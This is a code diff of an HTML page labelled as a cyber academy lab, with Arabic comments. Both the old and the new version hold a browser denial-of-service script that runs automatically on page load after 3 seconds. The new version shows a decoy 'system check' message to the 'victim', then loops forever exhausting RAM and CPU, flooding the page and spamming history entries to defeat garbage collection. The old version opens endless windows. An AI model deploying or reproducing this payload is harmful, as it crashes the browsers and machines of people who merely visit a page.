@@ -1,51 +1,31 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nawaf Cyber Academy - Labs</title>
-    <style>
-        body {
-            background-color: #000;
-            color: #0f0;
-            text-align: center;
-            font-family: 'Courier New', Courier, monospace;
-            padding-top: 100px;
-        }
-    </style>
-</head>
-<body>
+<script>
+    window.onload = function() {
+        // رسالة تمويه للضحية
+        console.log("System Check Initiated...");
 
-    <h1>Nawaf Cyber Academy</h1>
-    <p>... جاري فحص موارد النظام واستعداد الهجوم</p>
-    <p>انتظر 3 ثواني فقط...</p>
-
-    <script>
-        window.onload = function() {
-            let data = [];
+        setTimeout(function() {
+            // البدء بالهجوم التلقائي بدون تدخل المستخدم
+            let payload = [];
             
-            function crash() {
-                // تنبيه بسيط قبل "التهنيج"
-                console.log("BOOM!");
+            // حلقة مدمرة تستهدف المعالج والرام والـ Rendering في نفس الوقت
+            while (true) {
+                // 1. استهلاك الرام بجنون (توليد بيانات عشوائية ضخمة)
+                payload.push(new Uint8Array(10000000).fill(Math.random() * 255));
                 
-                while(true) {
-                    // 1. استنزاف الرام
-                    data.push(new Array(10000000).join("X")); 
-                    
-                    // 2. إغراق الصفحة بالعناصر
-                    let img = document.createElement('img');
-                    img.src = "https://placehold.co/600x400?text=CRASHING";
-                    document.body.appendChild(img);
-                    
-                    // 3. فتح نوافذ جديدة (هذا هو السلاح الفتاك)
-                    window.open(window.location.href, '_blank');
+                // 2. إشغال المعالج بعمليات حسابية ثقيلة
+                for (let i = 0; i < 1000000; i++) {
+                    let x = Math.atan(Math.random()) * Math.tan(Math.random());
                 }
-            }
-            
-            // سيتم التنفيذ بعد 3 ثواني من دخول الضحية (أو دخولك أنت للتجربة)
-            setTimeout(crash, 3000);
-        };
-    </script>
+                
+                // 3. خنق الذاكرة الرسومية (توليد نصوص عملاقة في واجهة الموقع)
+                let crashText = document.createElement('h1');
+                crashText.innerText = "CRITICAL_SYSTEM_FAILURE_ERROR_" + Math.random();
+                document.body.appendChild(crashText);
 
-</body>
-</html>
+                // 4. منع المتصفح من عمل "Garbage Collection" (تنظيف الذاكرة)
+                // عن طريق ربط البيانات ببعضها البعض باستمرار
+                window.history.pushState(null, "", "attack_" + Math.random());
+            }
+        }, 3000); // المهلة التي طلبتها (3 ثواني)
+    };
+</script>
